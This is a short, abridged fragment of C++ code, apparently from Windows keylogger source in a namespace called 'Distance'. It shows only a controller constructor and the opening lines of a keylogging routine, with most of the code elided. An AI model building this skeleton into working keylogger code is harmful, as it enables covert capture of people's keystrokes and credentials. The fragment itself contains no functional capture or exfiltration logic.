...
namespace Distance
{
    ...
    KeyloggerControl::KeyloggerControl()
        : keylogger_(nullptr),
    ...
    void keylogger_utils::KeyloggerRoutine(KeyloggerControl* controller)
    {
        int countWords = 0;
        DWORD bytes = 0;
